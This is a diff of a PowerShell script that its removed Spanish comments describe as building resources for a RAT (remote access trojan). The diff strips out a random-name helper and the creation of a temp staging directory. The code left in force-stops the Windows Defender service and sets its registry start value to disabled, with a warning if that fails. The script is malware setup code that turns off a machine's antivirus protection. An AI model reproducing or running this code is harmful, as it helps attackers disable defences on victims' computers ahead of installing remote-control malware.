@@ -1,12 +1,3 @@
-# Construir	recursos para el RAT
-
-#String random para los directorios.
-function random_text {
-	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
-}
-
-# Desactivando w_d
-# Fozar el detener el servicio w_d.
 try {
 	Get-Service WinDefend | Stop-Service -Force
 	Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
@@ -48,14 +39,4 @@ try
 } 
 catch {
 	Write-Warning "Failed to disable Windows Defender"
-}
-
-#Variables 
-$wd = random_text
-$path = "$env:temp/$wd"
-echo path
-
-#Crear directorio
-mkdir $path
-cd $path
-
+	}
